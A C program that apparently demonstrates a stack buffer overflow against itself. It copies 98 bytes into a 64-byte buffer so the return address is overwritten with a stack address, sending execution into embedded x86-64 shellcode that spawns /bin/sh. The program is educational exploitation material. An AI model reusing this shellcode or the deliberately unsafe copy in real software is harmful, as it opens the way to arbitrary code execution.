#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <string.h>

char *shellcode = 
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
"\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
"\x54\x5f\x99\x52\x57\x54\x5e\xb0"
"\x3b\x0f\x05\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x20\xdd\xff\xff\xff\x7f\x00\x00"; // for running outside GDB; it will likely need to be adjusted for your environment
// "\x90\xdf\xff\xff\xff\x7f\x00\x00"; // for running inside GDB


void smash(const char* input) {

    char buf[64];
    
    printf("before smash: input=%p\n", input);
    printf("before smash: buf=%p\n", buf);
    memcpy(buf, input, 98);
    printf("after smash: input=%p\n", input);
    printf("after smash: buf=%p\n", buf);

}

int main(void)
{
    unsigned long rbp_value;
    unsigned long rsp_value;

    __asm__("mov %%rsp, %0\n\t"
            "mov %%rbp, %1"
            : "=r" (rsp_value), "=r" (rbp_value) // Output operands
            );

    printf("rsp=0x%lx\n", rsp_value);
    printf("rbp=0x%lx\n", rbp_value);
    printf("stack size=%lu\n", rbp_value - rsp_value);

    smash(shellcode);
    printf("Done with shellcode!\n");

    return 0;
}